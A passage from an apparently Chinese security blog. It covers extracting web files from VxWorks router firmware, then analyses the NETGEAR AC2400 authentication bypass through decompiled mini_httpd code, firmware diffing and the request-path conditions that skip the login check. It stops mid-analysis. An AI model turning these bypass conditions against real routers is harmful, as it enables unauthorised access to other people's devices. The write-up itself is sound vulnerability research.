6c 70  2e 63 73 73 00 00 00 00  |css_help.css....|</span></span><br><span class="line"><span class="string">00134bd0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span></span><br><span class="line"><span class="string">00134be0  00 00 00 00 00 00 00 00  00 00 01 e0 00 00 27 6c  |..............'l|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 大小：00 00 01 e0</span></span><br><span class="line"><span class="string"># 偏移：00 00 27 6c</span></span><br><span class="line"><span class="string"># 开始地址：0x134b64 + 0x276c = 0x1372D0 + 0x1e0 = </span></span><br><span class="line"><span class="string"># 结束地址：0x1372D0 + 0x1e0 = 0x1374B0 = 1275056（是4的倍数，所以无需加00</span></span><br></pre></td></tr></table></figure>
<ul>
<li>综上，每个条目的结构体</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct owfs_entry</span><br><span class="line">&#123;</span><br><span class="line">   char file_name[40];<span class="comment"># 需用00填充至40</span></span><br><span class="line">   uint32_t file_size;<span class="comment"># 文件的真正大小</span></span><br><span class="line">   uint32_t file_offset;<span class="comment"># 在文件系统中的偏移，文件系统基地址为owow出现的地方（binwalk结果也可验证</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="05-获取web文件"><a href="#05-获取web文件" class="headerlink" title="05-获取web文件"></a>05-获取web文件</h2><h3 id="1-提取文件系统（from-固件"><a href="#1-提取文件系统（from-固件" class="headerlink" title="1-提取文件系统（from 固件"></a>1-提取文件系统（from 固件</h3><ul>
<li>注意：文件系统是在固件文件中的，可用dd提取出来</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 已知要提取多少数据</span></span><br><span class="line"><span class="comment"># count是针对bs的</span></span><br><span class="line">dd <span class="keyword">if</span>=US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin bs=1 count=8549574 skip=1674524 of=image</span><br><span class="line">		<span class="comment"># if 参数设置输入的文件，</span></span><br><span class="line">		<span class="comment"># bs 是输入输出块的大小，</span></span><br><span class="line">		<span class="comment"># count 是输入输出块的个数(抽取的总字节数可以理解为 bs * count)，</span></span><br><span class="line">		<span class="comment"># skip 是从文件头开始的偏移量，</span></span><br><span class="line">		<span class="comment"># of 指定输出字节的保存位置，这些数据在 binwalk 中都能找到。</span></span><br><span class="line">		</span><br><span class="line"><span class="comment"># 不知道要提取多少，只知道从一个偏移到最后（1264484是文件系统的开始地方，即字符串owow开始</span></span><br><span class="line"><span class="comment"># 可见skip也是针对bs的</span></span><br><span class="line">dd bs=1264484 skip=1 <span class="keyword">if</span>=mw150rv5-cn-up.bin of=filesystem.bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不可跟16进制</span></span><br></pre></td></tr></table></figure>
<h3 id="2-提取web文件（from-文件系统"><a href="#2-提取web文件（from-文件系统" class="headerlink" title="2-提取web文件（from 文件系统"></a>2-提取web文件（from 文件系统</h3><ul>
<li>提取出web文件：<a href="http://www.devttys0.com/wp-content/uploads/2011/06/unowfs.c" target="_blank" rel="noopener">http://www.devttys0.com/wp-content/uploads/2011/06/unowfs.c</a></li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ dd bs=1264484 skip=1 <span class="keyword">if</span>=mw150rv5-cn-up.bin of=filesystem.bin</span><br><span class="line">$ gcc -Wall unowfs.c -o unowfs</span><br><span class="line">$ ./unowfs filesystem.bin </span><br><span class="line">Extracting 167 files from OWFS version 1 image...</span><br><span class="line"></span><br><span class="line">common.js [2030]</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Extracted 167 files to ./owfs-root/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取后，文件内容不可读，应该还是压缩后的状态</span></span><br><span class="line">$ cat owfs-root/menu.js </span><br><span class="line"><span class="comment"># 还是有5a 00 00 80压缩的标记</span></span><br><span class="line">$ hexdump owfs-root/menu.js -C</span><br><span class="line">00000000  5a 00 00 80 00 8a 1f 00  00 00 00 00 00 00 3b 18  |Z.............;.|</span><br><span class="line">00000010  89 c2 e7 c3 a6 4f 05 bb  af 2c af a9 e6 08 f6 f8  |.....O...,......|</span><br></pre></td></tr></table></figure>
<h3 id="3-解压缩"><a href="#3-解压缩" class="headerlink" title="3-解压缩"></a>3-解压缩</h3><ul>
<li>解压缩</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># win下的7zip可识别出压缩算法，可直接解开</span></span><br><span class="line">类型: lzma</span><br><span class="line">算法: LZMA:23:lc0</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ubuntu下，自带p7zip，-d参数可解，但其只认.7z后缀的（手动修改以测试</span></span><br><span class="line">$ p7zip -d menu.js.7z </span><br><span class="line">Path = menu.js.7z</span><br><span class="line">Open WARNING: Can not open the file as [7z] archive</span><br><span class="line">Type = lzma<span class="comment"># 识别出lzma类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 既然是lzma压缩的，lzma也可直接解压缩，同样只认后缀为.lzma</span></span><br><span class="line">lzma -d menu.js.lzma </span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令行脚本批量解压</span></span><br><span class="line"><span class="keyword">for</span> FILE <span class="keyword">in</span> *; <span class="keyword">do</span> mv <span class="variable">$FILE</span> <span class="variable">$FILE</span>.7z &amp;&amp; p7zip -d <span class="variable">$FILE</span>.7z; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<h2 id="06-只有web文件？"><a href="#06-只有web文件？" class="headerlink" title="06-只有web文件？"></a>06-只有web文件？</h2><blockquote>
<p>为何文件系统中只有web文件，其他的如httpd程序呢（过程：固件文件中提取出文件系统、提取出web文件、解压缩web文件</p>
<p><a href="https://ioactive.com/solving-a-little-mystery/" target="_blank" rel="noopener">https://ioactive.com/solving-a-little-mystery/</a></p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">	This file system is part of the WindRiver’s Web Server architecture <span class="keyword">for</span> embedded devices, so you will likely find it inside firmwares based on VxWorks. It is known as MemFS (watch out, not the common MemFS) or Wind River management file system, and basically allows devices to serve files via the embedded web server without needing an ‘actual’ file system since this one lies on its non-volatile memory.</span><br><span class="line">	VxWorks  provides  pagepack, a tool used to transform any file intended to be served by a WindWeb server into C code. Therefore, a developer just compiles everything into the same firmware image.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个文件系统是WindRiver嵌入式设备Web服务器架构的一部分，因此可在基于VxWorks的固件中找到。</span></span><br><span class="line"><span class="comment"># 它被称为MemFS（并非普通的MemFS）或Wind-River文件系统。</span></span><br><span class="line"><span class="comment"># 设备可通过嵌入的web服务器提供文件，而不需要“实际”的文件系统，因为这个文件系统位于非易失性内存中。</span></span><br><span class="line"><span class="comment"># VxWorks提供pagepack工具（可将WindWeb服务器提供的任何文件转换为C代码），因此，开发者需要将所有东西编译到同一个固件镜像中。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># web文件经过pagepack转为为C代码，再与web服务器的C代码，一同编译成固件，如图</span></span><br></pre></td></tr></table></figure>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-06-072230.jpg" alt="image-20210106125432708"></p>
<ul>
<li>如何看来，固件中应该也有web服务器，怎么提取出来？//here</li>
</ul>
<h2 id="07-小结"><a href="#07-小结" class="headerlink" title="07-小结"></a>07-小结</h2><blockquote>
<p><a href="https://ioactive.com/solving-a-little-mystery/" target="_blank" rel="noopener">https://ioactive.com/solving-a-little-mystery/</a></p>
</blockquote>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-06-072232.jpg" alt="image-20210106143348400"></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">- The header is not necessarily 12 but 8 so the third field seems optional.</span><br><span class="line"><span class="comment"># header字段可能为12 或 8，后4字节可选</span></span><br><span class="line"><span class="comment"># （前面遇到的就是12字节</span></span><br><span class="line">- The first 4 bytes look like a flag field that may indicate, among other things,  whether  a file data will be compressed or not (1 = Compressed, 2 = Plain)</span><br><span class="line"><span class="comment"># header字段中，前4表示是否被压缩，因此：4-是否被压缩、4-文件个数、4-可选</span></span><br><span class="line"><span class="comment"># （前面的为1，就是被压缩的</span></span><br><span class="line">- The signature can vary between firmwares since it is defined by the constant ‘HTTP_UNIQUE_SIGNATURE’ , <span class="keyword">in</span> fact, we may find this signature twice inside a firmware; the first one due to  the .h  <span class="built_in">where</span> it is defined (close to other strings such as the webserver banner )and the second one already as part of  the MemFS.</span><br><span class="line"><span class="comment"># owow签名字符串可能不同（其他固件中并非也是owow），其是由常量 HTTP_UNIQUE_SIGNATURE 定义的</span></span><br><span class="line"><span class="comment"># 可能在固件中发现两次，第一次是在h头文件中（挨着web服务器banner信息），第二次就是文件系统中</span></span><br><span class="line"><span class="comment"># （前面的就出现了一次，即在文件系统的开头</span></span><br></pre></td></tr></table></figure>
<h3 id="1-总结构"><a href="#1-总结构" class="headerlink" title="1-总结构"></a>1-总结构</h3><p>综上，自己概括出结构</p>
<ul>
<li>签名<ul>
<li>32字节</li>
<li>可能不仅owow一种情况</li>
<li>可能在固件中出现两次（h头文件中、文件系统中</li>
</ul>
</li>
<li>header头<ul>
<li>共12字节（或8</li>
<li>4：是否压缩的标记</li>
<li>4：文件个数</li>
<li>4：可选</li>
</ul>
</li>
<li>文件项（数组）<ul>
<li>共48字节</li>
<li>40：文件名（00填充至40</li>
<li>4：文件大小</li>
<li>4：文件偏移（文件系统基地址为owow出现的地方</li>
</ul>
</li>
<li>文件数据（数组）<ul>
<li>两种情况：compressed 或 plain</li>
<li>若是压缩的，则4字节Magic + compressed data</li>
<li>文件大小会00填充，至4的倍数</li>
</ul>
</li>
</ul>
<h3 id="2-举例"><a href="#2-举例" class="headerlink" title="2-举例"></a>2-举例</h3><ul>
<li><p><a href="http://www.devttys0.com/2011/06/mystery-file-system/（header字段12字节" target="_blank" rel="noopener">http://www.devttys0.com/2011/06/mystery-file-system/（header字段12字节</a></p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-06-72235.jpg" alt="image-20210106151039295"></p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-06-072233.jpg" alt="image-20210106151823065"></p>
</li>
<li><p><a href="https://ioactive.com/solving-a-little-mystery/（header字段7字节，并且file" target="_blank" rel="noopener">https://ioactive.com/solving-a-little-mystery/（header字段7字节，并且file</a> entry也不同</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-06-072234.jpg" alt="image-20210106151805203"></p>
</li>
</ul>
<h2 id="08-其他"><a href="#08-其他" class="headerlink" title="08-其他"></a>08-其他</h2><ul>
<li>固件中能够提取出web服务器？</li>
</ul>
<blockquote>
<p>参考</p>
<ul>
<li><a href="http://www.devttys0.com/2011/06/mystery-file-system/" target="_blank" rel="noopener">http://www.devttys0.com/2011/06/mystery-file-system/</a></li>
<li><a href="https://ioactive.com/solving-a-little-mystery/" target="_blank" rel="noopener">https://ioactive.com/solving-a-little-mystery/</a></li>
</ul>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://21guns.top/2021/07/24/iot/NetGear-AC2400认证绕过漏洞分析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="21Guns">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="have a nice day">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/24/iot/NetGear-AC2400认证绕过漏洞分析/" class="post-title-link" itemprop="url">NetGear-AC2400认证绕过漏洞分析</a>
        </h2>

        <div class="post-meta">

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-07-24 14:41:33" itemprop="dateCreated datePublished" datetime="2021-07-24T14:41:33+08:00">2021-07-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-22 09:42:57" itemprop="dateModified" datetime="2022-02-22T09:42:57+08:00">2022-02-22</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IOT安全/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>[toc]</p>
<h1 id="NetGear-AC2400认证绕过漏洞分析"><a href="#NetGear-AC2400认证绕过漏洞分析" class="headerlink" title="NetGear-AC2400认证绕过漏洞分析"></a>NetGear-AC2400认证绕过漏洞分析</h1><h2 id="00-pre"><a href="#00-pre" class="headerlink" title="00-pre"></a>00-pre</h2><ul>
<li>固件下载：<a href="https://www.netgear.com/support/product/AC2400.aspx，1.2.0.74" target="_blank" rel="noopener">https://www.netgear.com/support/product/AC2400.aspx，1.2.0.74</a> 和 1.2.0.76 两个版本固件</li>
<li>漏洞通告：<a href="https://www.zerodayinitiative.com/advisories/ZDI-20-1451/" target="_blank" rel="noopener">https://www.zerodayinitiative.com/advisories/ZDI-20-1451/</a></li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">This vulnerability allows network-adjacent attackers to bypass authentication on affected installations of NETGEAR R6020, R6080, R6120, R6220, R6260, R6700v2, R6800, R6900v2, R7450, JNR3210, WNR2020, Nighthawk AC2100, and Nighthawk AC2400 routers. Authentication is not required to exploit this vulnerability.</span><br><span class="line"></span><br><span class="line">The specific flaw exists within the mini_httpd service, <span class="built_in">which</span> listens on TCP port 80 by default. The issue results from incorrect string matching logic when accessing protected pages. An attacker can leverage this <span class="keyword">in</span> conjunction with other vulnerabilities to execute code <span class="keyword">in</span> the context of root.</span><br></pre></td></tr></table></figure>
<h2 id="01-定位"><a href="#01-定位" class="headerlink" title="01-定位"></a>01-定位</h2><ul>
<li>Shift+F12 搜索字符串，漏洞位于处理用户请求的位置，所以直接搜索 Content-Length 或者其他请求头中会出现的字符串</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 incorrect string matching logic when accessing protected pages，可见是处理用户请求，其实一般都是</span></span><br><span class="line"><span class="comment"># 2 Content-Length、Content-Type、Host等常见的http请求头来定位</span></span><br></pre></td></tr></table></figure>
<ul>
<li>通过交叉引用可以定位到函数 0x40A540 (1.2.0.74)，其中存在以下代码片段</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 好像是一个报错的信息，哪个文件的哪个函数的哪一行</span></span><br><span class="line"><span class="comment"># 通过此，可判定函数名，handle_request</span></span><br><span class="line">v4 = (FILE *)fopen64(<span class="string">"/dev/console"</span>, <span class="string">"a+"</span>);</span><br><span class="line"><span class="keyword">if</span> ( v4 )</span><br><span class="line">&#123;</span><br><span class="line">  fprintf(v4, <span class="string">"[%s::%s():%d] "</span>, <span class="string">"mini_httpd.c"</span>, <span class="string">"handle_request"</span>, 1634);</span><br><span class="line">  fputs(<span class="string">"read\n"</span>, v4);</span><br><span class="line">  fclose(v4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>handle_request，用于处理http请求（通过名字），只有main中一处调用</li>
</ul>
<h2 id="02-修复点"><a href="#02-修复点" class="headerlink" title="02-修复点"></a>02-修复点</h2><ul>
<li>ida 68 + bindiff 43，找到修改项</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 确实找到0x40A540 vs 0040B5CC这一项，相似度0.65</span></span><br><span class="line"><span class="comment"># 不是一上来就bindiff看，往往有很多，不好定位，要换个思路：先找到相关函数，再bindiff验证是否不同，再细看</span></span><br><span class="line"><span class="comment"># 文中说ida75 + bindiff 6可，但之前测过好像不行</span></span><br></pre></td></tr></table></figure>
<ul>
<li>如何修复的？</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原话：比较两份代码，主要逻辑变化不大，但是新版中添加了 SSO 相关逻辑，即单点登录，猜测官方通过引入单点登录的手段对漏洞进行修复。（怎么看出主要逻辑变化不大的？硬看？</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ida75 反编译my_handle_requests函数，76中出现了大量“sso”字符串（36次），而74中一个都没有</span></span><br><span class="line"><span class="comment"># sso，单点登录（Single Sign On），用户只需要登录一次就可以访问所有相互信任的应用系统</span></span><br><span class="line"><span class="comment"># 猜测官方通过引入单点登录的手段对来对漏洞进行修复，待验证//here</span></span><br></pre></td></tr></table></figure>
<h2 id="03-关键函数"><a href="#03-关键函数" class="headerlink" title="03-关键函数"></a>03-关键函数</h2><h3 id="1-auth-check"><a href="#1-auth-check" class="headerlink" title="1-auth_check"></a>1-auth_check</h3><ul>
<li>找处理login请求的函数</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 auth、check等字符串</span></span><br><span class="line"><span class="comment"># 2 如上mini_httpd.c特定代码段的方式，看还有哪些函数</span></span><br><span class="line">fprintf(v30, <span class="string">"[%s::%s():%d] "</span>, <span class="string">"mini_httpd.c"</span>, <span class="string">"auth_check"</span>, 3682);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 找到在.text:00407FC0处，重命名为my_auth_check</span></span><br><span class="line"><span class="comment"># 2 被my_handle_request调用</span></span><br></pre></td></tr></table></figure>
<ul>
<li>判断is_setup_wizard标记（自命名的</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  检查某标记，不为1则正常登录</span></span><br><span class="line"><span class="comment">#  为1则跳过，进一步检查是否是lan用户，如果不是则丢弃</span></span><br><span class="line">char *__fastcall my_auth_check(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( is_setup_wizard != 1 )</span><br><span class="line">  &#123;</span><br><span class="line">  	<span class="comment"># 正常的登录逻辑</span></span><br><span class="line">  &#125;</span><br><span class="line">  v2 = check_lan_guest();</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment"># 如果from wan，则丢弃请求</span></span><br><span class="line">    v4 = <span class="string">"/bin/echo genie from wan, drop request &gt; /dev/console"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-handle-request"><a href="#2-handle-request" class="headerlink" title="2-handle_request"></a>2-handle_request</h3><ul>
<li>何处赋值is_setup_wizard标记</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 交叉引用 is_setup_wizard，找到my_handle_request中</span></span><br><span class="line"><span class="comment"># 但不全，需要反编译窗口中继续手动找</span></span><br><span class="line"><span class="comment"># 有多处，需分析后取舍，比如1229行调用my_auth_check，要找之前的、离他最近的，要833行，而555行不可</span></span><br><span class="line">  <span class="keyword">if</span> ( path_exist(path_1, off_427E50, method_str_1)</span><br><span class="line">    || (path_3 = path_1, strstr(path_1, <span class="string">"htpwd_recovery.cgi"</span>))</span><br><span class="line">    &amp;&amp; (method_post = get_method_str(3), !strcasecmp(method_str_1, method_post))</span><br><span class="line">    || strstr(path_3, <span class="string">"PNPX_GetShareFolderList"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    what_1 = 0;<span class="comment"># 只满足外层if时</span></span><br><span class="line">    what_2 = 0;<span class="comment"># 清0</span></span><br><span class="line">    <span class="keyword">if</span> ( strstr(path_1, <span class="string">"currentsetting.htm"</span>) )</span><br><span class="line">      is_setup_wizard = 1;<span class="comment"># 两层if都要满足</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 要执行到，有2个if要满足</span></span><br><span class="line"><span class="comment"># 内层：请求的path中有"currentsetting.htm"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 外层：3个或关系，其中一个是&amp;起来的，即a || b&amp;&amp;c || d，&amp;&amp;优先级高于||</span></span><br><span class="line"><span class="comment"># 要求1：访问的path要在off_427e50中</span></span><br><span class="line">.data:00427E50 off_427E50:     .word aCurrentsetting_0  <span class="comment"># DATA XREF: my_handle_request+1B80↑o</span></span><br><span class="line">.data:00427E50                                          <span class="comment"># my_handle_request:loc_40C178↑o</span></span><br><span class="line">.data:00427E50                                          <span class="comment"># "currentsetting.htm"</span></span><br><span class="line">.data:00427E54                 .word aUpdateSettingH    <span class="comment"># "update_setting.htm"</span></span><br><span class="line">.data:00427E58                 .word aDebuginfoHtm      <span class="comment"># "debuginfo.htm"</span></span><br><span class="line">.data:00427E5C                 .word aImportantUpdat    <span class="comment"># "important_update.htm"</span></span><br><span class="line">.data:00427E60                 .word aMnuTopHtm         <span class="comment"># "MNU_top.htm"</span></span><br><span class="line">.data:00427E64                 .word aWarningPgHtm      <span class="comment"># "warning_pg.htm"</span></span><br><span class="line">.data:00427E68                 .word aMultiLoginHtml    <span class="comment"># "multi_login.html"</span></span><br><span class="line">.data:00427E6C                 .word a401RecoveryHtm    <span class="comment"># "401_recovery.htm"</span></span><br><span class="line">.data:00427E70                 .word a401AccessDenie    <span class="comment"># "401_access_denied.htm"</span></span><br><span class="line">.data:00427E74                 .word aBrsNetgearSucc    <span class="comment"># "BRS_netgear_success.html"</span></span><br><span class="line">.data:00427E78                 .word aBrsTopHtml        <span class="comment"># "BRS_top.html"</span></span><br><span class="line">.data:00427E7C                 .word aBrsMiiicasaSuc    <span class="comment"># "BRS_miiicasa_success.html"</span></span><br><span class="line">.data:00427E80                 .word aOpenvpnConfirm    <span class="comment"># "openvpn_confirm_update.htm"</span></span><br><span class="line">.data:00427E84                 .word aTcExistUnitHij    <span class="comment"># "tc_exist_unit_hijack.htm"</span></span><br><span class="line">.data:00427E88                 .word aBrsDataDetailH    <span class="comment"># "BRS_data_detail.htm"</span></span><br><span class="line">.data:00427E8C                 .word aBrsFullTcnHtm     <span class="comment"># "BRS_full_tcn.htm"</span></span><br><span class="line">.data:00427E90                 .word 0</span><br><span class="line"><span class="comment"># 要求2: 访问的path中包含"htpwd_recovery.cgi"，并且请求类型是POST</span></span><br><span class="line">const char *__fastcall get_method_str(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  switch ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> 2:</span><br><span class="line">      <span class="built_in">return</span> <span class="string">"HEAD"</span>;</span><br><span class="line">    <span class="keyword">case</span> 3:</span><br><span class="line">      <span class="built_in">return</span> <span class="string">"POST"</span>;</span><br><span class="line">    <span class="keyword">case</span> 1:</span><br><span class="line">      <span class="built_in">return</span> <span class="string">"GET"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> <span class="string">"UNKNOWN"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 要求3: path中有"PNPX_GetShareFolderList"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4 只满足外层if时，还会赋值2全局变量为0，可能会用到</span></span><br></pre></td></tr></table></figure>
<h3 id="3-do-file"><a href="#3-do-file" class="headerlink" title="3-do_file"></a>3-do_file</h3><ul>
<li>my_handle_request中还调用了my_do_file</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 由名字do_file可大致猜出：执行cig文件</span></span><br><span class="line"><span class="comment"># httpd 只充当处理请求的角色，在确定了访问哪些接口之后，它会调用相应的 cgi 程序，此函数就负责解析和调用这些 cgi 程序</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !what_2</span><br><span class="line">    || is_setup_wizard</span><br><span class="line">    || *v7 != <span class="string">'0'</span></span><br><span class="line">    || *v8 == <span class="string">'b'</span></span><br><span class="line">    || !authorization</span><br><span class="line">    || !*authorization</span><br><span class="line">    || !strncmp(path_1, <span class="string">"/cgi-bin/genie.cgi"</span>, 0x12u) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( access(<span class="string">"/tmp/dbg_sessionid"</span>, 0) )</span><br><span class="line">      goto LABEL_43;</span><br><span class="line">    v14 = fopen64(<span class="string">"/dev/console"</span>, <span class="string">"a+"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v14 )</span><br><span class="line">      goto LABEL_43;</span><br><span class="line">    fprintf(v14, <span class="string">"[%s::%s():%d] "</span>, <span 